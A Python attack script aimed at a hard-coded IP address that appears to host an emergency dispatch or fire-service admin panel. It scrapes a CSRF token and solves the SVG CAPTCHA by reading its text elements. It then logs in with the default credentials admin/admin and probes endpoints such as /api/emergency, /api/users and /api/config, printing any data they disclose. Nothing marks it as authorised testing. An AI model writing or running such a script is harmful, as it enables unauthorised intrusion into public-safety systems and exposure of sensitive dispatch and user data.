#!/usr/bin/env python3
"""
Explore API endpoints for data disclosure
"""

import requests
import json
import re

TARGET = "https://210.69.42.55"
sess = requests.Session()
sess.verify = False

# First, get a valid session by logging in
login_page = sess.get(f"{TARGET}/admin/login").text
token_match = re.search(r'name="_token" value="([^"]+)"', login_page)
if token_match:
    token = token_match.group(1)

# Get captcha
captcha_svg = sess.get(f"{TARGET}/admin/captcha").text
text_matches = re.findall(r'<text[^>]*x="(\d+)"[^>]*>([A-Z0-9]+)</text>', captcha_svg)
if text_matches:
    text_matches.sort(key=lambda x: int(x[0]))
    captcha = ''.join([t[1] for t in text_matches])
else:
    captcha = "ABCD1"

# Login
login_data = {"_token": token, "username": "admin", "password": "admin", "captcha": captcha}
sess.post(f"{TARGET}/admin/login", data=login_data)

# Test API endpoints
api_endpoints = [
    "/api/dispatch",
    "/api/call", 
    "/api/emergency",
    "/api/fireman",
    "/api/patrol",
    "/dispatch",
    "/call",
    "/emergency",
    "/fireman",
    "/patrol",
    "/station",
    "/stations",
    "/incident",
    "/incidents",
    "/api/data",
    "/api/admin",
    "/api/users",
    "/api/config",
    "/api/settings"
]

print("[*] Testing API endpoints...\n")

for endpoint in api_endpoints:
    url = f"{TARGET}{endpoint}"
    
    # Test GET
    try:
        resp = sess.get(url, timeout=5)
        print(f"GET {endpoint}: {resp.status_code}")
        
        # Check if it's JSON
        try:
            data = resp.json()
            print(f"  -> JSON Response: {json.dumps(data, indent=2)[:500]}")
        except:
            # Check for HTML with data
            if "dispatch" in resp.text.lower() or "call" in resp.text.lower():
                print(f"  -> HTML with potential data")
                # Look for div content
                divs = re.findall(r'<div[^>]*>([^<]+)</div>', resp.text)
                for d in divs[:5]:
                    if len(d) > 10:
                        print(f"     {d.strip()[:100]}")
        print()
    except Exception as e:
        print(f"GET {endpoint}: ERROR - {e}\n")
    
    # Test POST
    try:
        resp = sess.post(url, json={}, timeout=5)
        print(f"POST {endpoint}: {resp.status_code}")
        print()
    except:
        pass